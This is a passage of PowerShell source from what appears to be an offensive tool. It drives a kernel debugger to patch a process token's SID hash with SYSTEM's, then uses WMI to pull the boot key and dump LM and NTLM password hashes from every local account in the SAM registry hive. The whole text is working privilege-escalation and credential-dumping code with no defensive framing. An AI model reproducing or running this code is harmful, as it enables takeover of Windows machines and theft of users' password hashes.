$tokenSidHashOffset = "$processTokenAddressAnded$sidHashOffset"
$chain = "$symfix
.formats $tokenSidHashOffset"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')            
$fi = [array]::indexof($tabFA,"Hex:") + 11 + $delta
$formatTokenSidHashOffset = $tabFA[$fi]

$chain = "$symfix
f $formatTokenSidHashOffset L100 $hashSystem"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

$chain = "$symfix
dt nt!_eprocess ActiveProcessLinks. ImageFileName $processAddress"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"[") + 7 + $delta
$processAddress = $tabFA[$fi]
Write-Output "`r`n=============================="
whoami
Write-Output "==============================`r`n"

$wmi = Get-WmiObject -List "StdRegProv" -Namespace root\default -ComputerName $strComputer

LoadApi
$bootkey = Get-BootKey;
$hbootKey = Get-HBootKey -bootkey $bootkey -WMI $wmi

$registryKey = "SAM\SAM\Domains\Account\Users\"
$subKeys = $wmi.EnumKey($($regKey.HKEY_LOCAL_MACHINE), $registryKey)
if ($subKeys.ReturnValue -eq 0) {
    forEach ($name in $subKeys.sNames) {
        if ($name -match "^[0-9A-Fa-f]{8}$") {
            $subKey = "$registryKey\$name"              
            $V = Get-ValueByType  -RegistryHive $($regKey.HKEY_LOCAL_MACHINE) -RegistryKeyToQuery $subkey -ValueName "V" -ValueType 3 -WMI $wmi # -Credential $Credential \
            $F = Get-ValueByType  -RegistryHive $($regKey.HKEY_LOCAL_MACHINE) -RegistryKeyToQuery $subkey -ValueName "F" -ValueType 3 -WMI $wmi # -Credential $Credential \
                       
            $userName = Get-UserName $($V.Data)
            $hashOffset = [BitConverter]::ToUInt32($($V.Data)[0x9c..0x9f],0) + 0xCC            
            $rid = [Convert]::ToInt32($name, 16)
            $(Get-LastLogonDate($($F.Data)))
            if($(Get-LastLogonDate($($F.Data))) -eq "0x0000000000000000"){
                $logonDate = "Empty"
            }
            else {
                $logonDate = $([datetime]::FromFileTime($(Get-LastLogonDate($($F.Data)))).ToLocalTime())
            }

            if($(Get-LastLogonDate($($F.Data))) -eq "0x0000000000000000"){
                $passwordLastSet = "Empty"
            }
            else {
                $passwordLastSet = $([datetime]::FromFileTime($(Get-LastLogonDate($($F.Data)))).ToLocalTime())
            }

            $user = New-Object PSObject        
            $user | Add-Member -MemberType NoteProperty -Name "V" -Value $($V.Data)
            $user | Add-Member -MemberType NoteProperty -Name "UserName" -Value $userName
            $user | Add-Member -MemberType NoteProperty -Name "Rid" -Value $rid
            $user | Add-Member -MemberType NoteProperty -Name "HashOffset" -Value $hashOffset  
            $user | Add-Member -MemberType NoteProperty -Name "LastLogonDate" -Value $logonDate
            $user | Add-Member -MemberType NoteProperty -Name "PasswordLastSet" -Value $passwordLastSet
             
            $hashes = Get-UserHashes $user $hBootKey; 
            
            if($([BitConverter]::ToString($hashes[0]).Replace('-','').ToLower()) -eq "aad3b435b51404eeaad3b435b51404ee") {
                $hashLM = "Empty"
            }
            else {
                $hashLM = $([BitConverter]::ToString($hashes[0]).Replace('-','').ToLower())
            }
            if($([BitConverter]::ToString($hashes[1]).Replace('-','').ToLower()) -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                $hashNTLM =  "Empty"
            }
            else {
                $hashNTLM = $([BitConverter]::ToString($hashes[1]).Replace('-','').ToLower())
            }           

            Write-Output "UserName: $($user.UserName) ($($user.Rid))`r`n LM Hash: $hashLM`r`n NTLM Hash: $hashNTLM`r`n Last Logon:$($user.LastLogonDate)`r`n Password Last Set $($user.PasswordLastSet)"
        }                       
    }
}

Read-Host 'press any key to exit'